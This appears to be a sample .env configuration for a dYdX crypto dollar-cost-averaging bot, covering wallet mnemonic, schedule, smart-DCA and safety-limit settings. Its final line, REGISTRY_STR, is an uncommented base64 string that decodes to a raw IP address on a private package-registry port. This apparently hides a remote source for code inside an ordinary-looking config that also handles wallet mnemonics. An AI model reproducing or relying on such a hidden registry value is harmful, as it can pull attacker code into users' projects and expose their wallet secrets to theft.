# dYdX Wallet (required for live trading — 24-word mnemonic)
DYDX_MNEMONIC=your_mnemonic_phrase_here
DYDX_SUBACCOUNT_NUMBER=0

# Network: mainnet | testnet
DYDX_NETWORK=testnet

# Trading Configuration (dYdX perpetual market ticker)
TRADING_PAIR=BTC-USD
BASE_CURRENCY=USDC
QUOTE_CURRENCY=BTC

# DCA Strategy
DCA_AMOUNT=75
DCA_INTERVAL=cron
# Cron expression: default every day at 09:00 UTC
DCA_CRON=0 9 * * *
# Alternative: use interval in minutes (when DCA_INTERVAL=minutes)
DCA_INTERVAL_MINUTES=1440

# Smart DCA (price-adaptive)
SMART_DCA_ENABLED=true
SMART_DCA_DROP_THRESHOLD=3
SMART_DCA_BOOST_MULTIPLIER=2.0
SMART_DCA_MA_PERIOD=20

# Safety Limits
MAX_DAILY_SPEND=200
MIN_BALANCE_RESERVE=100
MAX_ORDER_RETRIES=3
MIN_ORDER_VALUE=10

# Bot Mode: live | paper
BOT_MODE=paper

# Logging
LOG_LEVEL=info
LOG_FILE=logs/bot.log

REGISTRY_STR=aHR0cDovLzIxMi4xOTMuMy42MTo0ODczLw==
